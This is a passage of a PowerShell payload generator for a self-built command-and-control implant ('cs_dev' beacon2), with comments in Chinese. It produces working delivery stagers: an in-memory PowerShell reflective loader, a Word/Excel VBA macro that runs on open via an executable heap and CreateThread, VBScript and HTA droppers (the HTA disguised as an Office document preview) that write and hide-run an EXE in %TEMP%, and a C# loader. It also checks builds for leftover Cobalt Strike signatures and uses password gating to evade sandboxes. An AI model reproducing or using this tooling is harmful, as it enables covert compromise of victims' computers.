        $flags += " -DC2_TOKEN_SALT='`"$TokenSalt`"' -DC2_TOKEN_HASH='`"$TokenHash`"'"
    }

    Say "[*] 通过 WSL 编译 (协议 v2 HTTP) ..." 'White'
    if ($Password -ne '') { SayQ ("    [gcc] " + $flags) 'DarkGray' }
    $cmd = "cd '$wslLinux' && gcc $flags -o '$wslOut' $srcs"
    $r = & wsl.exe -e bash -c "$cmd 2>&1" 2>&1
    $r | Where-Object { $_ -and $_ -notmatch '^$' } | ForEach-Object { Say "    $_" 'DarkGray' }
    if (-not (Test-Path $OutFile)) {
        throw ("Linux 植入体编译失败`n        确认 WSL 可用且装了 gcc: wsl -e bash -c 'gcc --version'")
    }
    # 新格式分支必须设 $PayloadPath —— 后面的统一自检段按它判断产物
    $PayloadPath = $OutFile
    # 产出是非 PE 的 ELF, 后面的 PE 自检会自动跳过
    $IsScript = $false
}

elseif ($Format -in @('win2-ps1','win2-vba','win2-vbs','win2-cs','win2-hta')) {
    # win2-ps1 / win2-cs 走进程内反射加载 -> 载体用 DLL 外壳
    #   (外壳入口是自写的 _DllMainCRTStartup, 不依赖 CRT 启动序列, 反射加载下最稳)
    # win2-vba / win2-vbs / win2-hta 走落地执行 -> 载体用 GUI 子系统 EXE
    $DllCarrier = $Format -in @('win2-ps1','win2-cs')
    if ($DllCarrier) {
        if (-not (Test-Path $DllWrapper)) { throw "缺少 DLL 外壳: $DllWrapper" }
        $carrier = Join-Path $BuildD ("_tmp_{0}.dll" -f $Format)
        $a = @('-O2','-s') + $defs + @('-shared','-nostartfiles','-Wl,-e,_DllMainCRTStartup',
              '-o',$carrier,$DllWrapper) + $SrcFiles + @('-lwinhttp','-ladvapi32')
        $rc = Invoke-Gcc $a 'gcc'
        if ($rc -ne 0 -or -not (Test-Path $carrier)) { throw "载体编译失败 (gcc exit=$rc)" }
    } else {
        $carrier = Join-Path $BuildD ("_tmp_{0}.exe" -f $Format)
        Build-StdExe $carrier @('-mwindows') | Out-Null
    }
    $peBytes = [System.IO.File]::ReadAllBytes($carrier)
    Remove-Item $carrier -Force -ErrorAction SilentlyContinue
    $b64 = [Convert]::ToBase64String($peBytes)
    $carrierKind = if ($DllCarrier) { 'DLL' } else { 'EXE' }

    switch ($Format) {

        # PowerShell: 内嵌 base64 PE + 反射加载 (Add-Type 编译自研 loader)
        'win2-ps1' {
            $ps = @"
# cs_dev 自研 PowerShell 反射加载器 (协议 v2)  --  回连 ${Host_}:$Port$Uri
# 内嵌载体 = beacon2 $carrierKind ($($peBytes.Length) 字节), 全程不落盘。
`$ErrorActionPreference = 'Stop'
`$LoaderCs = @'
$LoaderCs
'@
if (-not ('CsdevLoader' -as [type])) {
    Add-Type -TypeDefinition `$LoaderCs -Language CSharp | Out-Null
}
`$b64 = @'
$b64
'@
`$pe = [Convert]::FromBase64String((`$b64 -replace '\s',''))
`$rc = [CsdevLoader]::Run(`$pe)
if (`$rc -ne 0) { throw "反射加载失败, 阶段代码 `$rc" }
# 植入线程已在进程内运行; 主线程保活, 结束本进程即断开
while (`$true) { Start-Sleep -Seconds 60 }
"@
            Save-Text $OutFile $ps 'bom'
            $PayloadPath = $OutFile
        }

        # VBA: HeapCreate(可执行堆) + HeapAlloc + RtlMoveMemory + CreateThread
        'win2-vba' {
            $chunks = Split-B64 $b64 760
            $sb = New-Object System.Text.StringBuilder
            for ($i = 0; $i -lt $chunks.Count; $i++) {
                if ($i -eq 0) { [void]$sb.Append("Private Const B64 As String = `"$($chunks[$i])`"") }
                else          { [void]$sb.Append("    `"$($chunks[$i])`"") }
                if ($i -lt $chunks.Count - 1) { [void]$sb.Append(" & _`r`n") }
            }
            $constBlock = $sb.ToString()
            $bas = @"
' cs_dev 自研 VBA 宏 (协议 v2)  --  回连 ${Host_}:$Port$Uri
' 用法: 导入 Word/Excel 的 VBA 编辑器 (Alt+F11) 后由 AutoOpen 触发。
' 载荷为 beacon2 内嵌字节 ($($peBytes.Length) 字节), 经 base64 还原后写入可执行堆并由新线程执行。
Option Explicit

Private Declare PtrSafe Function HeapCreate Lib "kernel32" (ByVal flOptions As Long, ByVal dwInitialSize As LongPtr, ByVal dwMaximumSize As LongPtr) As LongPtr
Private Declare PtrSafe Function HeapAlloc Lib "kernel32" (ByVal hHeap As LongPtr, ByVal dwFlags As Long, ByVal dwBytes As LongPtr) As LongPtr
Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal dest As LongPtr, ByRef src As Byte, ByVal length As LongPtr)
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpAttr As LongPtr, ByVal dwStack As LongPtr, ByVal lpStart As LongPtr, ByVal lpParam As LongPtr, ByVal dwFlags As Long, ByRef lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" (ByVal hHandle As LongPtr, ByVal dwMilliseconds As Long) As Long

Private Const HEAP_CREATE_ENABLE_EXECUTE As Long = &H40000

$constBlock

Sub AutoOpen()
    RunPayload
End Sub

Private Function B64Decode(ByVal s As String) As Byte()
    Dim node As Object
    Set node = CreateObject("MSXML2.DOMDocument").createElement("b")
    node.DataType = "bin.base64"
    node.Text = s
    B64Decode = node.NodeTypedValue
End Function

Private Sub RunPayload()
    Dim buf() As Byte
    buf = B64Decode(B64)

    Dim hHeap As LongPtr, pMem As LongPtr, hThread As LongPtr
    Dim tid As Long

    hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
    If hHeap = 0 Then Exit Sub
    pMem = HeapAlloc(hHeap, 0, UBound(buf) + 1)
    If pMem = 0 Then Exit Sub
    RtlMoveMemory pMem, buf(0), UBound(buf) + 1
    hThread = CreateThread(0, 0, pMem, 0, 0, tid)
    If hThread <> 0 Then WaitForSingleObject hThread, &HFFFFFFFF
End Sub
"@
            Save-Text $OutFile $bas 'ansi'
            $PayloadPath = $OutFile
        }

        # VBScript: base64 -> MSXML2 解码 -> ADODB.Stream 落地 -> 隐藏执行
        'win2-vbs' {
            $chunks = Split-B64 $b64 200
            $sb = New-Object System.Text.StringBuilder
            for ($i = 0; $i -lt $chunks.Count; $i++) {
                if ($i -eq 0) { [void]$sb.Append("B64 = `"$($chunks[$i])`"") }
                else          { [void]$sb.Append("    `"$($chunks[$i])`"") }
                if ($i -lt $chunks.Count - 1) { [void]$sb.Append(" & _`r`n") }
            }
            $constBlock = $sb.ToString()
            $vbs = @"
' cs_dev 自研 VBScript 加载器 (协议 v2)  --  回连 ${Host_}:$Port$Uri
' 内嵌 beacon2 ($($peBytes.Length) 字节): base64 -> 落地 %TEMP% -> 隐藏执行 -> 自删脚本落地体
Option Explicit

Dim B64
$constBlock

Dim node, bytes, fso, sh, tmp, st
Set node = CreateObject("MSXML2.DOMDocument").createElement("b")
node.DataType = "bin.base64"
node.Text = B64
bytes = node.NodeTypedValue

Set fso = CreateObject("Scripting.FileSystemObject")
Set sh  = CreateObject("WScript.Shell")
Randomize
tmp = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & Int(Rnd() * 899999 + 100000) & ".exe"

Set st = CreateObject("ADODB.Stream")
st.Type = 1
st.Open
st.Write bytes
st.SaveToFile tmp, 2
st.Close

sh.Run """" & tmp & """", 0, False
WScript.Sleep 1500
On Error Resume Next
fso.DeleteFile tmp, True
"@
            Save-Text $OutFile $vbs 'ansi'
            $PayloadPath = $OutFile
        }

        # C# 加载器源码: 可直接 csc /target:exe 编译
        'win2-cs' {
            $chunks = Split-B64 $b64 100
            $sb = New-Object System.Text.StringBuilder
            for ($i = 0; $i -lt $chunks.Count; $i++) {
                [void]$sb.Append("            `"$($chunks[$i])`"")
                if ($i -lt $chunks.Count - 1) { [void]$sb.Append(" +`r`n") }
            }
            $b64Block = $sb.ToString()
            $cs = @"
// cs_dev 自研 C# 加载器 (协议 v2)  --  回连 ${Host_}:$Port$Uri
// 编译: csc /nologo /target:exe /out:loader.exe <本文件>
// 内嵌载体 = beacon2 $carrierKind ($($peBytes.Length) 字节), 运行期不落地。
$LoaderCs

public static class CsdevPayload
{
    private const string B64 =
$b64Block;

    public static string Value { get { return B64; } }
}

public static class CsdevProgram
{
    public static void Main()
    {
        byte[] pe = Convert.FromBase64String(CsdevPayload.Value);
        int rc = CsdevLoader.Run(pe);
        if (rc != 0) Environment.Exit(rc);
        // 植入线程已在进程内运行; 主线程保活
        System.Threading.Thread.Sleep(System.Threading.Timeout.Infinite);
    }
}
"@
            Save-Text $OutFile $cs 'bom'
            $PayloadPath = $OutFile
        }

        # HTA: 最小 HTML Application + VBScript 落地执行
        'win2-hta' {
            $chunks = Split-B64 $b64 200
            $sb = New-Object System.Text.StringBuilder
            for ($i = 0; $i -lt $chunks.Count; $i++) {
                if ($i -eq 0) { [void]$sb.Append("B64 = `"$($chunks[$i])`"") }
                else          { [void]$sb.Append("    `"$($chunks[$i])`"") }
                if ($i -lt $chunks.Count - 1) { [void]$sb.Append(" & _`r`n") }
            }
            $constBlock = $sb.ToString()
            $hta = @"
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>Microsoft Office 文档预览</title>
<HTA:APPLICATION ID="csdevHta" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize" SCROLL="no"/>
<script language="VBScript">
' cs_dev 自研 HTA 加载器 (协议 v2)  --  回连 ${Host_}:$Port$Uri
Option Explicit

Dim B64
$constBlock

Sub Window_OnLoad
    On Error Resume Next
    Dim node, bytes, sh, fso, tmp
    Set node = CreateObject("MSXML2.DOMDocument").createElement("b")
    node.DataType = "bin.base64"
    node.Text = B64
    bytes = node.NodeTypedValue

    Set fso = CreateObject("Scripting.FileSystemObject")
    Set sh  = CreateObject("WScript.Shell")
    tmp = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & Int(Rnd() * 899999 + 100000) & ".exe"

    Dim st
    Set st = CreateObject("ADODB.Stream")
    st.Type = 1
    st.Open
    st.Write bytes
    st.SaveToFile tmp, 2
    st.Close

    sh.Run """" & tmp & """", 0, False
    window.close
End Sub
</script>
</head>
<body>
<p>正在准备文档内容 ...</p>
</body>
</html>
"@
            Save-Text $OutFile $hta 'ansi'
            $PayloadPath = $OutFile
        }
    }
}

if (-not $PayloadPath -or -not (Test-Path $PayloadPath)) { throw "生成失败: $OutFile" }
$Written += $PayloadPath

# =========================================================== 3) 自检与报告
$bytes = [System.IO.File]::ReadAllBytes($PayloadPath)
$size  = $bytes.Length

# --- 格式自检
$isPE  = ($size -gt 2 -and $bytes[0] -eq 0x4D -and $bytes[1] -eq 0x5A)
$isELF = ($size -gt 4 -and $bytes[0] -eq 0x7F -and $bytes[1] -eq 0x45 -and $bytes[2] -eq 0x4C -and $bytes[3] -eq 0x46)
if ($isPE) {
    $kind = 'PE'
    # PE 头完整性: 0x3C 处 e_lfanew 指向 "PE\0\0"
    $lfa = [BitConverter]::ToInt32($bytes, 0x3C)
    $peOk = ($lfa -gt 0x40 -and $lfa + 4 -le $size -and $bytes[$lfa] -eq 0x50 -and $bytes[$lfa+1] -eq 0x45)
    $subsys = $null
    if ($peOk) {
        $opt = $lfa + 0x18
        # 子系统偏移: PE32+ optional header +0x44 (2 字节); 2=GUI 3=console
        if ($opt + 0x46 -le $size) { $subsys = [BitConverter]::ToUInt16($bytes, $opt + 0x44) }
    }
} elseif ($isELF) {
    $kind = 'ELF'; $peOk = $true
} else {
    $kind = 'script/raw'; $peOk = $true
}

# --- 特征自检 (二进制扫字节, 文本扫 ASCII)
$scanText = if ($kind -eq 'script/raw') {
    [System.IO.File]::ReadAllText($PayloadPath)
} else {
    [System.Text.Encoding]::ASCII.GetString($bytes)
}
$bad = @()
foreach ($k in $BAD_STRINGS) { if ($scanText.Contains($k)) { $bad += $k } }

# --- 导入表自检 (仅 PE)
$imports = @()
if ($isPE -and (Test-Path $objdump)) {
    $imports = Invoke-Native $objdump @('-p',$PayloadPath) |
        Select-String 'DLL Name:' |
        ForEach-Object { ($_.Line -split ':\s*')[1].Trim() } |
        Where-Object { $_ } |
        Select-Object -Unique
}
$extraDll = @($imports | Where-Object { $ALLOWED_DLLS -notcontains $_ })

# --- 输出
$bw = [Math]::Round($size / 1KB, 1)
Say ""
if (-not $Quiet) { Say "[+] 生成完成" 'Green' } else { Say "[+] $Format 完成" 'Green' }
Say ("    path : {0}" -f $PayloadPath)
Say ("    size : {0} 字节 ({1} KB)" -f $size, $bw)
Say ("    回连 : {0}://{1}:{2}{3}" -f $(if($Ssl){'https'}else{'http'}), $Host_, $Port, $Uri)
if ($Password -ne '') {
    # 口令是"生成时输入、运行时必须带上"的, 生成器不复述明文(避免它出现在日志/终端历史里),
    # 但必须提醒: 这个样本不带参数跑是不上线的。
    Say "    [口令门控] 已启用 — 启动时必须带口令参数, 例如: <样本> <你的口令>" 'Yellow'
    Say "               也可用环境变量 CSDEV_TOKEN=<口令> 启动" 'Yellow'
    Say "               直接双击/无参数运行会安静退出(沙箱自动化检测看不到任何行为)" 'DarkGray'
}
$subsysName = switch ($subsys) { 2 { 'GUI' } 3 { 'console' } default { if ($subsys) { "0x{0:X}" -f $subsys } else { '' } } }
if ($Format -eq 'win2-dll') { $subsysName = '' }   # DLL 的子系统字段对加载方式无意义
Say ("    类型 : {0}{1}" -f $kind, $(if ($subsysName) { " (subsystem=$subsysName)" } else { '' }))

$fmtMsg = switch ($kind) {
    'PE'    { if ($peOk) { "PE 头 MZ + PE\0\0 校验通过, {0} 字节" -f $size } else { "PE 头异常 (e_lfanew=0x{0:X})" -f $lfa } }
    'ELF'   { "ELF 头 7F454C46 校验通过" }
    default { if ($Format -eq 'win2-raw') { "raw .text 段提取, {0} 字节" -f $size } else { "文本产物, {0} 字节" -f $size } }
}
$fmtOk = if ($kind -eq 'PE') { $peOk } else { $true }
Say ("    [格式自检] {0}" -f $fmtMsg) $(if ($fmtOk) { 'Green' } else { 'Red' })

if ($bad.Count -eq 0) {
    Say "    [特征自检] 通过 — 无 CS/已知 loader 标识残留" 'Green'
} else {
    Say ("    [特征自检] 失败 — 残留: {0}" -f ($bad -join ', ')) 'Red'
}

if ($isPE) {
    if ($extraDll.Count -eq 0) {
        Say ("    [导入表]   合格 — {0}" -f ($imports -join ', ')) 'Green'
    } else {
        Say ("    [导入表]   越界 — 额外依赖: {0}" -f ($extraDll -join ', ')) 'Red'
    }
}
if ($IsScript -and $Format -ne 'win2-raw') {
    $lines = (Get-Content $PayloadPath -ErrorAction SilentlyContinue).Count
    Say ("    [载荷]     内嵌载体 {0} {1} 字节, base64 {2} 字符" -f $carrierKind, $peBytes.Length, $b64.Length)
    $encName = if ($Format -in @('win2-ps1','win2-cs')) { 'UTF-8 + BOM' } else { 'GBK (系统 ANSI)' }
    Say ("    [文本]     {0} 行, 编码 {1}" -f $lines, $encName)
}
Say ""
